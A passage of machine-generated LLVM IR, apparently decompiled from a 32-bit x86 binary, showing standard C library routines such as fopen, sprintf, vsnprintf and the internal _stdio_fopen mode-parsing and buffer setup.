  %v0_804dc5d = load i32, i32* @esi, align 4
  %v1_804dc5d = add i32 %v0_804dc5d, 1
  %v2_804dc5d = inttoptr i32 %v1_804dc5d to i8*
  %v3_804dc5d = load i8, i8* %v2_804dc5d, align 1
  %v4_804dc5d = and i8 %v3_804dc5d, 64
  %v5_804dc5d = icmp eq i8 %v4_804dc5d, 0
  br i1 %v5_804dc5d, label %dec_label_pc_804dc71, label %dec_label_pc_804dc63

dec_label_pc_804dc63:                             ; preds = %dec_label_pc_804dc5d
  %v1_804dc66 = add i32 %v0_804dc5d, 8
  %v2_804dc66 = inttoptr i32 %v1_804dc66 to i32*
  %v3_804dc66 = load i32, i32* %v2_804dc66, align 4
  %v1_804dc69 = call i32 @free(i32 %v3_804dc66)
  store i32 %v1_804dc69, i32* @eax, align 4
  br label %dec_label_pc_804dc71

dec_label_pc_804dc71:                             ; preds = %dec_label_pc_804dc5d, %dec_label_pc_804dc63
  %v2_804dc7d = call i32 @__pthread_return_void(i32 %v2_804dc11, i32 134550743)
  %v1_804dc89 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8058254.185 to i32))
  store i32 ptrtoint (i32* @global_var_8058254.185 to i32), i32* @eax, align 4
  %v0_804dc90 = load i32, i32* @global_var_805c4e8.187, align 8
  %v1_804dc90 = add i32 %v0_804dc90, 1
  store i32 %v1_804dc90, i32* @global_var_805c4e8.187, align 8
  %v2_804dc99 = call i32 @__pthread_return_void(i32 %v2_804dc11, i32 1)
  %v0_804dc9e = call i32 @_stdio_openlist_dec_use()
  %v0_804dca6 = load i32, i32* @edi, align 4
  store i32 %v0_804dba7, i32* @ebx, align 4
  store i32 %v0_804dba6, i32* @esi, align 4
  store i32 %v0_804dba5, i32* @edi, align 4
  store i32 %v0_804dba4, i32* @ebp, align 4
  ret i32 %v0_804dca6

; uselistorder directives
  uselistorder label %dec_label_pc_804dc71, { 1, 0 }
  uselistorder label %dec_label_pc_804dc5d, { 1, 0 }
  uselistorder label %dec_label_pc_804dbff, { 1, 0 }
  uselistorder label %dec_label_pc_804dbea, { 1, 0 }
  uselistorder label %dec_label_pc_804dbd5, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_804dcbf = inttoptr i32 %arg2 to i8*
  %v5_804dcbf = call i32 @_stdio_fopen(i32 %arg1, i8* %v4_804dcbf, i32 0, i32 -1)
  ret i32 %v5_804dcbf
}

define i32 @sprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_12 = alloca i32, align 4
  %v2_804dccb = ptrtoint i32* %stack_var_12 to i32
  %v4_804dcde = inttoptr i32 %arg1 to i8*
  %v5_804dcde = call i32 @__GI_vsnprintf(i8* %v4_804dcde, i32 -1, i32 %arg2, i32 %v2_804dccb)
  ret i32 %v5_804dcde
}

define i32 @__GI_vsnprintf(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804dce8 = load i32, i32* @ebp, align 4
  %v0_804dce9 = load i32, i32* @edi, align 4
  %v0_804dcea = load i32, i32* @esi, align 4
  %v0_804dceb = load i32, i32* @ebx, align 4
  store i32 %v0_804dceb, i32* %stack_var_-16, align 4
  %v4_804dcef = ptrtoint i8* %arg1 to i32
  store i32 %v4_804dcef, i32* @esi, align 4
  %v2_804dcf3 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg2, i32* @edi, align 4
  store i32 208, i32* %stack_var_-96, align 4
  %v2_804dd24 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_804dd24, i32* @ebp, align 4
  %v1_804dd28 = sub i32 -1, %v4_804dcef
  store i32 %v1_804dd28, i32* @ebx, align 4
  %v1_804dd2b = call i32 @__stdio_init_mutex(i32 %v2_804dcf3)
  %v0_804dd3b = load i32, i32* @ebx, align 4
  %v1_804dd3b = load i32, i32* @edi, align 4
  %tmp35 = icmp ugt i32 %v0_804dd3b, %v1_804dd3b
  br i1 %tmp35, label %dec_label_pc_804dd3f, label %dec_label_pc_804dd41

dec_label_pc_804dd3f:                             ; preds = %entry
  store i32 %v1_804dd3b, i32* @ebx, align 4
  br label %dec_label_pc_804dd41

dec_label_pc_804dd41:                             ; preds = %entry, %dec_label_pc_804dd3f
  %v1_804dd41 = phi i32 [ %v0_804dd3b, %entry ], [ %v1_804dd3b, %dec_label_pc_804dd3f ]
  %v0_804dd41 = load i32, i32* @esi, align 4
  %v2_804dd41 = add i32 %v0_804dd41, %v1_804dd41
  %v4_804dd6c = inttoptr i32 %arg3 to i8*
  %v5_804dd6c = call i32 @_vfprintf_internal(i32 %v2_804dd24, i8* %v4_804dd6c, i32 %arg4, i32 %v2_804dd41)
  store i32 %v5_804dd6c, i32* @edx, align 4
  %v0_804dd76 = load i32, i32* @ebx, align 4
  %v1_804dd76 = icmp eq i32 %v0_804dd76, 0
  br i1 %v1_804dd76, label %dec_label_pc_804dd90, label %dec_label_pc_804dd7a

dec_label_pc_804dd7a:                             ; preds = %dec_label_pc_804dd41
  %v16_804dd7e = icmp eq i32 %v1_804dd41, 0
  %v1_804dd82 = icmp eq i1 %v16_804dd7e, false
  br i1 %v1_804dd82, label %dec_label_pc_804dd89, label %dec_label_pc_804dd84

dec_label_pc_804dd84:                             ; preds = %dec_label_pc_804dd7a
  %v1_804dd84 = add i32 %v2_804dd41, -1
  br label %dec_label_pc_804dd89

dec_label_pc_804dd89:                             ; preds = %dec_label_pc_804dd7a, %dec_label_pc_804dd84
  %stack_var_-80.0.in = phi i32 [ %v0_804dd41, %dec_label_pc_804dd7a ], [ %v1_804dd84, %dec_label_pc_804dd84 ]
  %stack_var_-80.0 = inttoptr i32 %stack_var_-80.0.in to i8*
  store i8 0, i8* %stack_var_-80.0, align 1
  %v0_804dd93.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804dd90

dec_label_pc_804dd90:                             ; preds = %dec_label_pc_804dd41, %dec_label_pc_804dd89
  %v0_804dd93 = phi i32 [ %v5_804dd6c, %dec_label_pc_804dd41 ], [ %v0_804dd93.pre, %dec_label_pc_804dd89 ]
  %v2_804dd95 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804dd95, i32* @ebx, align 4
  store i32 %v0_804dcea, i32* @esi, align 4
  store i32 %v0_804dce9, i32* @edi, align 4
  store i32 %v0_804dce8, i32* @ebp, align 4
  ret i32 %v0_804dd93

; uselistorder directives
  uselistorder i32 %v0_804dd41, { 1, 0 }
  uselistorder i32 %v1_804dd41, { 1, 0 }
  uselistorder i32 %v1_804dd3b, { 1, 2, 0 }
  uselistorder i32 %v0_804dd3b, { 1, 0 }
  uselistorder i32* %stack_var_-96, { 1, 0 }
  uselistorder label %dec_label_pc_804dd90, { 1, 0 }
  uselistorder label %dec_label_pc_804dd89, { 1, 0 }
  uselistorder label %dec_label_pc_804dd41, { 1, 0 }
}

define i32 @_stdio_fopen(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804dd9c = load i32, i32* @ebp, align 4
  %v0_804dd9d = load i32, i32* @edi, align 4
  %v0_804dd9e = load i32, i32* @esi, align 4
  %v0_804dd9f = load i32, i32* @ebx, align 4
  store i32 %v0_804dd9f, i32* %stack_var_-16, align 4
  %v4_804dda3 = ptrtoint i8* %arg2 to i32
  store i32 %v4_804dda3, i32* @edx, align 4
  store i32 %arg1, i32* @esi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %v2_804ddb3 = load i8, i8* %arg2, align 1
  %v3_804ddb3 = zext i8 %v2_804ddb3 to i32
  %v4_804ddb3 = load i32, i32* @eax, align 4
  %v5_804ddb3 = and i32 %v4_804ddb3, -256
  %v6_804ddb3 = or i32 %v5_804ddb3, %v3_804ddb3
  store i32 %v6_804ddb3, i32* %eax.global-to-local, align 4
  %v10_804ddb5 = icmp eq i8 %v2_804ddb3, 114
  br i1 %v10_804ddb5, label %dec_label_pc_804ddf7, label %dec_label_pc_804ddb9

dec_label_pc_804ddb9:                             ; preds = %entry
  store i32 577, i32* @ebx, align 4
  %v10_804ddbe = icmp eq i8 %v2_804ddb3, 119
  br i1 %v10_804ddbe, label %dec_label_pc_804ddf9, label %dec_label_pc_804ddc2

dec_label_pc_804ddc2:                             ; preds = %dec_label_pc_804ddb9
  store i32 1089, i32* @ebx, align 4
  %v10_804ddc6 = icmp eq i8 %v2_804ddb3, 97
  br i1 %v10_804ddc6, label %dec_label_pc_804ddf9, label %dec_label_pc_804ddca

dec_label_pc_804ddca:                             ; preds = %dec_label_pc_804ddc2, %dec_label_pc_804de72, %dec_label_pc_804de4c
  %v0_804ddca = load i32, i32* %stack_var_-16, align 4
  %v1_804ddca = call i32 @__errno_location(i32 %v0_804ddca)
  store i32 %v1_804ddca, i32* %eax.global-to-local, align 4
  %v0_804ddcf = load i32, i32* @ebp, align 4
  %v1_804ddcf = icmp eq i32 %v0_804ddcf, 0
  %v1_804ddd1 = inttoptr i32 %v1_804ddca to i32*
  store i32 22, i32* %v1_804ddd1, align 4
  br i1 %v1_804ddcf, label %dec_label_pc_804dfbf, label %dec_label_pc_804dddd

dec_label_pc_804dddd:                             ; preds = %dec_label_pc_804ddca, %dec_label_pc_804de9b
  %v0_804dddd = load i32, i32* @ebp, align 4
  %v1_804dddd = add i32 %v0_804dddd, 1
  %v2_804dddd = inttoptr i32 %v1_804dddd to i8*
  %v3_804dddd = load i8, i8* %v2_804dddd, align 1
  %v4_804dddd = and i8 %v3_804dddd, 32
  %v5_804dddd = icmp eq i8 %v4_804dddd, 0
  br i1 %v5_804dddd, label %dec_label_pc_804dfbf, label %dec_label_pc_804dde7

dec_label_pc_804dde7:                             ; preds = %dec_label_pc_804dddd
  store i32 %v0_804dddd, i32* %stack_var_-76, align 4
  %v1_804ddeb = call i32 @free(i32 %v0_804dddd)
  store i32 %v1_804ddeb, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_804dfba

dec_label_pc_804ddf7:                             ; preds = %entry
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804ddf9

dec_label_pc_804ddf9:                             ; preds = %dec_label_pc_804ddc2, %dec_label_pc_804ddb9, %dec_label_pc_804ddf7
  %v0_804de0a = phi i32 [ 1089, %dec_label_pc_804ddc2 ], [ 577, %dec_label_pc_804ddb9 ], [ 1, %dec_label_pc_804ddf7 ]
  %v1_804ddf9 = add i32 %v4_804dda3, 1
  store i32 %v1_804ddf9, i32* %eax.global-to-local, align 4
  %v2_804ddfc = inttoptr i32 %v1_804ddf9 to i8*
  %v3_804ddfc = load i8, i8* %v2_804ddfc, align 1
  %v12_804ddfc = icmp eq i8 %v3_804ddfc, 98
  br i1 %v12_804ddfc, label %dec_label_pc_804de04, label %dec_label_pc_804de02

dec_label_pc_804de02:                             ; preds = %dec_label_pc_804ddf9
  store i32 %v4_804dda3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804de04

dec_label_pc_804de04:                             ; preds = %dec_label_pc_804ddf9, %dec_label_pc_804de02
  %v0_804de04 = phi i32 [ %v1_804ddf9, %dec_label_pc_804ddf9 ], [ %v4_804dda3, %dec_label_pc_804de02 ]
  %v1_804de04 = add i32 %v0_804de04, 1
  %v2_804de04 = inttoptr i32 %v1_804de04 to i8*
  %v3_804de04 = load i8, i8* %v2_804de04, align 1
  %v12_804de04 = icmp eq i8 %v3_804de04, 43
  %v1_804de08 = icmp eq i1 %v12_804de04, false
  br i1 %v1_804de08, label %dec_label_pc_804de12, label %dec_label_pc_804de0a

dec_label_pc_804de0a:                             ; preds = %dec_label_pc_804de04
  store i32 %v0_804de0a, i32* %eax.global-to-local, align 4
  %v1_804de0f = add nuw nsw i32 %v0_804de0a, 1
  store i32 %v1_804de0f, i32* @ebx, align 4
  br label %dec_label_pc_804de12

dec_label_pc_804de12:                             ; preds = %dec_label_pc_804de04, %dec_label_pc_804de0a
  %v1_804de12 = icmp eq i32 %arg3, 0
  %v1_804de14 = icmp eq i1 %v1_804de12, false
  br i1 %v1_804de14, label %dec_label_pc_804de48, label %dec_label_pc_804de16

dec_label_pc_804de16:                             ; preds = %dec_label_pc_804de12
  store i32 80, i32* %stack_var_-76, align 4
  %v1_804de1b = call i32 @malloc(i32 80)
  store i32 %v1_804de1b, i32* %eax.global-to-local, align 4
  store i32 %v1_804de1b, i32* @ebp, align 4
  %v2_804de25 = icmp eq i32 %v1_804de1b, 0
  br i1 %v2_804de25, label %dec_label_pc_804dfc1, label %dec_label_pc_804de2d

dec_label_pc_804de2d:                             ; preds = %dec_label_pc_804de16
  %v2_804de1b = inttoptr i32 %v1_804de1b to i16*
  store i16 8192, i16* %v2_804de1b, align 2
  %v2_804de35 = add i32 %v1_804de1b, 8
  %v3_804de35 = inttoptr i32 %v2_804de35 to i32*
  store i32 0, i32* %v3_804de35, align 4
  %v2_804de3c = add i32 %v1_804de1b, 56
  store i32 %v2_804de3c, i32* %eax.global-to-local, align 4
  store i32 %v2_804de3c, i32* %stack_var_-76, align 4
  %v1_804de40 = call i32 @__stdio_init_mutex(i32 %v2_804de3c)
  store i32 %v1_804de40, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804de48

dec_label_pc_804de48:                             ; preds = %dec_label_pc_804de12, %dec_label_pc_804de2d
  %v2_804de48 = icmp slt i32 %arg4, 0
  br i1 %v2_804de48, label %dec_label_pc_804de95, label %dec_label_pc_804de4c

dec_label_pc_804de4c:                             ; preds = %dec_label_pc_804de48
  %v0_804de4c = load i32, i32* @ebx, align 4
  %v0_804de4e = load i32, i32* @esi, align 4
  %v1_804de4e = add i32 %v0_804de4e, 1
  store i32 %v1_804de4e, i32* %eax.global-to-local, align 4
  %v1_804de51 = and i32 %v0_804de4c, 32771
  store i32 %v1_804de51, i32* %edx.global-to-local, align 4
  %v1_804de57 = load i32, i32* @ebp, align 4
  %v2_804de57 = add i32 %v1_804de57, 4
  %v3_804de57 = inttoptr i32 %v2_804de57 to i32*
  store i32 %arg4, i32* %v3_804de57, align 4
  %v0_804de5a = load i32, i32* %edx.global-to-local, align 4
  %v1_804de5a = add i32 %v0_804de5a, 1
  store i32 %v1_804de5a, i32* @edx, align 4
  %v0_804de5b = load i32, i32* %eax.global-to-local, align 4
  %v2_804de5b = and i32 %v0_804de5b, %v1_804de5a
  store i32 %v2_804de5b, i32* %eax.global-to-local, align 4
  %v12_804de5d = icmp eq i32 %v2_804de5b, %v1_804de5a
  %v1_804de5f = icmp eq i1 %v12_804de5d, false
  br i1 %v1_804de5f, label %dec_label_pc_804ddca, label %dec_label_pc_804de65

dec_label_pc_804de65:                             ; preds = %dec_label_pc_804de4c
  %v0_804de65 = load i32, i32* @esi, align 4
  %v1_804de67 = and i32 %v0_804de65, 1024
  %v1_804de69 = xor i32 %v1_804de67, 1024
  store i32 %v1_804de69, i32* %eax.global-to-local, align 4
  %v1_804de6e = load i32, i32* @ebx, align 4
  %v2_804de6e = and i32 %v1_804de6e, %v1_804de69
  %v3_804de6e = icmp eq i32 %v2_804de6e, 0
  br i1 %v3_804de6e, label %dec_label_pc_804de65.dec_label_pc_804de8b_crit_edge, label %dec_label_pc_804de72

dec_label_pc_804de65.dec_label_pc_804de8b_crit_edge: ; preds = %dec_label_pc_804de65
  br label %dec_label_pc_804de8b

dec_label_pc_804de72:                             ; preds = %dec_label_pc_804de65
  store i32 %arg4, i32* %stack_var_-76, align 4
  %v3_804de7b = call i32 @__libc_fcntl(i32 %arg4, i32 4, i32 1024)
  store i32 %v3_804de7b, i32* %eax.global-to-local, align 4
  %v1_804de83 = icmp eq i32 %v3_804de7b, 0
  %v1_804de85 = icmp eq i1 %v1_804de83, false
  br i1 %v1_804de85, label %dec_label_pc_804ddca, label %dec_label_pc_804de72.dec_label_pc_804de8b_crit_edge

dec_label_pc_804de72.dec_label_pc_804de8b_crit_edge: ; preds = %dec_label_pc_804de72
  %v0_804de8b.pre = load i32, i32* @esi, align 4
  %v0_804de91.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804de8b

dec_label_pc_804de8b:                             ; preds = %dec_label_pc_804de65.dec_label_pc_804de8b_crit_edge, %dec_label_pc_804de72.dec_label_pc_804de8b_crit_edge
  %v0_804de91 = phi i32 [ %v1_804de6e, %dec_label_pc_804de65.dec_label_pc_804de8b_crit_edge ], [ %v0_804de91.pre, %dec_label_pc_804de72.dec_label_pc_804de8b_crit_edge ]
  %v0_804de8b = phi i32 [ %v0_804de65, %dec_label_pc_804de65.dec_label_pc_804de8b_crit_edge ], [ %v0_804de8b.pre, %dec_label_pc_804de72.dec_label_pc_804de8b_crit_edge ]
  %v1_804de8b = and i32 %v0_804de8b, 32768
  %v2_804de91 = or i32 %v1_804de8b, %v0_804de91
  store i32 %v2_804de91, i32* @ebx, align 4
  br label %dec_label_pc_804deb6

dec_label_pc_804de95:                             ; preds = %dec_label_pc_804de48
  %v1_804de95 = add i32 %arg4, 1
  %v8_804de95 = icmp eq i32 %v1_804de95, 0
  store i32 %v1_804de95, i32* @edi, align 4
  %v0_804dea1.pre = load i32, i32* @ebx, align 4
  br i1 %v8_804de95, label %dec_label_pc_804de9b, label %dec_label_pc_804de98

dec_label_pc_804de98:                             ; preds = %dec_label_pc_804de95
  %v11_804de98 = or i32 %v0_804dea1.pre, 32768
  store i32 %v11_804de98, i32* @ebx, align 4
  br label %dec_label_pc_804de9b

dec_label_pc_804de9b:                             ; preds = %dec_label_pc_804de95, %dec_label_pc_804de98
  %v0_804dea1 = phi i32 [ %v11_804de98, %dec_label_pc_804de98 ], [ %v0_804dea1.pre, %dec_label_pc_804de95 ]
  %v0_804dea2 = load i32, i32* @esi, align 4
  store i32 %v0_804dea2, i32* %stack_var_-76, align 4
  %v3_804dea3 = inttoptr i32 %v0_804dea2 to i8*
  %v4_804dea3 = call i32 @__libc_open(i8* %v3_804dea3, i32 %v0_804dea1)
  store i32 %v4_804dea3, i32* %eax.global-to-local, align 4
  %v1_804deab = load i32, i32* @ebp, align 4
  %v2_804deab = add i32 %v1_804deab, 4
  %v3_804deab = inttoptr i32 %v2_804deab to i32*
  store i32 %v4_804dea3, i32* %v3_804deab, align 4
  %v2_804deae = icmp slt i32 %v4_804dea3, 0
  br i1 %v2_804deae, label %dec_label_pc_804dddd, label %dec_label_pc_804deb6

dec_label_pc_804deb6:                             ; preds = %dec_label_pc_804de9b, %dec_label_pc_804de8b
  %v0_804deb6 = load i32, i32* @ebp, align 4
  %v1_804deb6 = inttoptr i32 %v0_804deb6 to i16*
  %v2_804deb6 = load i16, i16* %v1_804deb6, align 2
  %v3_804deb6 = and i16 %v2_804deb6, 8192
  store i16 %v3_804deb6, i16* %v1_804deb6, align 2
  %v0_804debc = load i32, i32* @ebx, align 4
  %v8_804debe = and i32 %v0_804debc, -31744
  %v1_804dec3 = urem i32 %v0_804debc, 4
  %v1_804dec6 = add nuw nsw i32 %v1_804dec3, 1
  store i32 %v1_804dec6, i32* %eax.global-to-local, align 4
  %v1_804dec7 = load i32, i32* @ebp, align 4
  %v2_804dec7 = inttoptr i32 %v1_804dec7 to i32*
  %v3_804dec7 = load i32, i32* %v2_804dec7, align 4
  %v4_804dec7 = or i32 %v3_804dec7, %v8_804debe
  %v1_804deca = mul nuw nsw i32 %v1_804dec6, 16
  %v2_804decd = xor i32 %v1_804deca, 48
  store i32 %v2_804decd, i32* %eax.global-to-local, align 4
  %v2_804ded0 = or i32 %v4_804dec7, %v2_804decd
  store i32 %v2_804ded0, i32* @ebx, align 4
  %v1_804ded2 = trunc i32 %v2_804ded0 to i16
  %v3_804ded2 = inttoptr i32 %v1_804dec7 to i16*
  store i16 %v1_804ded2, i16* %v3_804ded2, align 2
  %v0_804ded6 = load i32, i32* %stack_var_-76, align 4
  %v1_804ded6 = call i32 @__errno_location(i32 %v0_804ded6)
  store i32 %v1_804ded6, i32* %eax.global-to-local, align 4
  store i32 %v1_804ded6, i32* @esi, align 4
  %v1_804dee0 = inttoptr i32 %v1_804ded6 to i32*
  %v2_804dee0 = load i32, i32* %v1_804dee0, align 4
  store i32 %v2_804dee0, i32* @edi, align 4
  %v0_804dee2 = load i32, i32* @ebp, align 4
  %v1_804dee2 = add i32 %v0_804dee2, 4
  %v2_804dee2 = inttoptr i32 %v1_804dee2 to i32*
  %v3_804dee2 = load i32, i32* %v2_804dee2, align 4
  store i32 %v3_804dee2, i32* %stack_var_-76, align 4
  %v1_804dee5 = call i32 @isatty(i32 %v3_804dee2)
  %v2_804deed = mul i32 %v1_804dee5, 256
  store i32 %v2_804deed, i32* %eax.global-to-local, align 4
  %v0_804def0 = load i32, i32* @ebx, align 4
  %v2_804def0 = or i32 %v0_804def0, %v2_804deed
  store i32 %v2_804def0, i32* @ebx, align 4
  %v1_804def2 = trunc i32 %v2_804def0 to i16
  %v2_804def2 = load i32, i32* @ebp, align 4
  %v3_804def2 = inttoptr i32 %v2_804def2 to i16*
  store i16 %v1_804def2, i16* %v3_804def2, align 2
  %v0_804def6 = load i32, i32* @edi, align 4
  %v1_804def6 = load i32, i32* @esi, align 4
  %v2_804def6 = inttoptr i32 %v1_804def6 to i32*
  store i32 %v0_804def6, i32* %v2_804def6, align 4
  %v0_804def8 = load i32, i32* @ebp, align 4
  %v1_804def8 = add i32 %v0_804def8, 8
  %v2_804def8 = inttoptr i32 %v1_804def8 to i32*
  %v3_804def8 = load i32, i32* %v2_804def8, align 4
  %v4_804def8 = icmp eq i32 %v3_804def8, 0
  %v1_804defc = icmp eq i1 %v4_804def8, false
  br i1 %v1_804defc, label %dec_label_pc_804df2c, label %dec_label_pc_804defe

dec_label_pc_804defe:                             ; preds = %dec_label_pc_804deb6
  store i32 4096, i32* %stack_var_-76, align 4
  %v1_804df06 = call i32 @malloc(i32 4096)
  store i32 %v1_804df06, i32* %eax.global-to-local, align 4
  %v1_804df0e = load i32, i32* @ebp, align 4
  %v2_804df0e = add i32 %v1_804df0e, 8
  %v3_804df0e = inttoptr i32 %v2_804df0e to i32*
  store i32 %v1_804df06, i32* %v3_804df0e, align 4
  %v1_804df11 = icmp eq i32 %v1_804df06, 0
  %v0_804df25 = load i32, i32* @ebp, align 4
  br i1 %v1_804df11, label %dec_label_pc_804df25, label %dec_label_pc_804df15

dec_label_pc_804df15:                             ; preds = %dec_label_pc_804defe
  %v1_804df15 = inttoptr i32 %v0_804df25 to i16*
  %v2_804df15 = load i16, i16* %v1_804df15, align 2
  %v3_804df15 = or i16 %v2_804df15, 16384
  store i16 %v3_804df15, i16* %v1_804df15, align 2
  %v1_804df1b = add i32 %v1_804df06, 4096
  store i32 %v1_804df1b, i32* %eax.global-to-local, align 4
  %v1_804df20 = load i32, i32* @ebp, align 4
  %v2_804df20 = add i32 %v1_804df20, 12
  %v3_804df20 = inttoptr i32 %v2_804df20 to i32*
  store i32 %v1_804df1b, i32* %v3_804df20, align 4
  br label %dec_label_pc_804df2c

dec_label_pc_804df25:                             ; preds = %dec_label_pc_804defe
  %v1_804df25 = add i32 %v0_804df25, 12
  %v2_804df25 = inttoptr i32 %v1_804df25 to i32*
  store i32 0, i32* %v2_804df25, align 4
  br label %dec_label_pc_804df2c

dec_label_pc_804df2c:                             ; preds = %dec_label_pc_804deb6, %dec_label_pc_804df15, %dec_label_pc_804df25
  %v0_804df2c = load i32, i32* @ebp, align 4
  %v1_804df2c = add i32 %v0_804df2c, 8
  %v2_804df2c = inttoptr i32 %v1_804df2c to i32*
  %v3_804df2c = load i32, i32* %v2_804df2c, align 4
  store i32 %v3_804df2c, i32* %eax.global-to-local, align 4
  %v1_804df2f = add i32 %v0_804df2c, 2
  %v2_804df2f = inttoptr i32 %v1_804df2f to i8*
  store i8 0, i8* %v2_804df2f, align 1
  %v0_804df33 = load i32, i32* %eax.global-to-local, align 4
  %v1_804df33 = load i32, i32* @ebp, align 4
  %v2_804df33 = add i32 %v1_804df33, 24
  %v3_804df33 = inttoptr i32 %v2_804df33 to i32*
  store i32 %v0_804df33, i32* %v3_804df33, align 4
  %v0_804df36 = load i32, i32* %eax.global-to-local, align 4
  %v1_804df36 = load i32, i32* @ebp, align 4
  %v2_804df36 = add i32 %v1_804df36, 28
  %v3_804df36 = inttoptr i32 %v2_804df36 to i32*
  store i32 %v0_804df36, i32* %v3_804df36, align 4
  %v0_804df39 = load i32, i32* %eax.global-to-local, align 4
  %v1_804df39 = load i32, i32* @ebp, align 4
  %v2_804df39 = add i32 %v1_804df39, 16
  %v3_804df39 = inttoptr i32 %v2_804df39 to i32*
  store i32 %v0_804df39, i32* %v3_804df39, align 4
  %v0_804df3c = load i32, i32* %eax.global-to-local, align 4
  %v1_804df3c = load i32, i32* @ebp, align 4
  %v2_804df3c = add i32 %v1_804df3c, 20
  %v3_804df3c = inttoptr i32 %v2_804df3c to i32*
  store i32 %v0_804df3c, i32* %v3_804df3c, align 4
  %v0_804df3f = load i32, i32* @ebp, align 4
  %v1_804df3f = add i32 %v0_804df3f, 44
  %v2_804df3f = inttoptr i32 %v1_804df3f to i32*
  store i32 0, i32* %v2_804df3f, align 4
  %v0_804df46 = load i32, i32* @ebp, align 4
  %v1_804df46 = add i32 %v0_804df46, 1
  %v2_804df46 = inttoptr i32 %v1_804df46 to i8*
  %v3_804df46 = load i8, i8* %v2_804df46, align 1
  %v4_804df46 = and i8 %v3_804df46, 32
  %v5_804df46 = icmp eq i8 %v4_804df46, 0
  %v0_804df4a = load i32, i32* @global_var_805826c.188, align 4
  store i32 %v0_804df4a, i32* @eax, align 4
  %v2_804df4f = add i32 %v0_804df46, 52
  %v3_804df4f = inttoptr i32 %v2_804df4f to i32*
  store i32 %v0_804df4a, i32* %v3_804df4f, align 4
  br i1 %v5_804df46, label %dec_label_pc_804dfc1, label %dec_label_pc_804df54

dec_label_pc_804df54:                             ; preds = %dec_label_pc_804df2c
  %v2_804df5f = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804df5f, i32* %stack_var_-76, align 4
  %v2_804df64 = call i32 @__pthread_return_void(i32 %v2_804df5f, i32 134550743)
  store i32 %v2_804df64, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8058254.185 to i32), i32* %stack_var_-76, align 4
  %v1_804df70 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8058254.185 to i32))
  store i32 %v1_804df70, i32* @eax, align 4
  %v2_804df82 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_804df82, i32* %stack_var_-76, align 4
  %v2_804df87 = call i32 @__pthread_return_void(i32 %v2_804df82, i32 134550743)
  store i32 %v2_804df87, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805823c.189 to i32), i32* %stack_var_-76, align 4
  %v1_804df93 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805823c.189 to i32))
  %v0_804df98 = load i32, i32* bitcast (i32** @global_var_8058238.190 to i32*), align 8
  store i32 %v0_804df98, i32* @eax, align 4
  %v1_804df9d = load i32, i32* @ebp, align 4
  %v2_804df9d = add i32 %v1_804df9d, 32
  %v3_804df9d = inttoptr i32 %v2_804df9d to i32*
  store i32 %v0_804df98, i32* %v3_804df9d, align 4
  %v0_804dfa0 = load i32, i32* @ebp, align 4
  store i32 %v0_804dfa0, i32* bitcast (i32** @global_var_8058238.190 to i32*), align 8
  %v2_804dfa6 = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_804dfa6, i32* @ecx, align 4
  store i32 %v2_804df82, i32* %stack_var_-76, align 4
  %v2_804dfab = call i32 @__pthread_return_void(i32 %v2_804df82, i32 1)
  store i32 %v2_804df82, i32* @eax, align 4
  store i32 1, i32* @edx, align 4
  store i32 %v2_804df5f, i32* %stack_var_-76, align 4
  %v2_804dfb5 = call i32 @__pthread_return_void(i32 %v2_804df5f, i32 1)
  store i32 %v2_804dfb5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804dfba

dec_label_pc_804dfba:                             ; preds = %dec_label_pc_804dde7, %dec_label_pc_804df54
  br label %dec_label_pc_804dfc1

dec_label_pc_804dfbf:                             ; preds = %dec_label_pc_804dddd, %dec_label_pc_804ddca
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_804dfc1

dec_label_pc_804dfc1:                             ; preds = %dec_label_pc_804df2c, %dec_label_pc_804de16, %dec_label_pc_804dfba, %dec_label_pc_804dfbf
  %v0_804dfc4 = load i32, i32* @ebp, align 4
  store i32 %v0_804dfc4, i32* %eax.global-to-local, align 4
  %v2_804dfc6 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804dfc6, i32* @ebx, align 4
  store i32 %v0_804dd9e, i32* @esi, align 4
  store i32 %v0_804dd9d, i32* @edi, align 4
  store i32 %v0_804dd9c, i32* @ebp, align 4
  ret i32 %v0_804dfc4

; uselistorder directives
  uselistorder i32 %v2_804df82, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_804df5f, { 1, 0, 3, 2 }
  uselistorder i32 %v0_804df25, { 1, 0 }
  uselistorder i32 %v1_804df06, { 1, 2, 0, 3 }
  uselistorder i32 %v2_804deed, { 1, 0 }
  uselistorder i32 %v1_804ded6, { 1, 0, 2 }
  uselistorder i32 %v11_804de98, { 1, 0 }
  uselistorder i32 %v0_804dea1.pre, { 1, 0 }
  uselistorder i32 %v1_804de69, { 1, 0 }
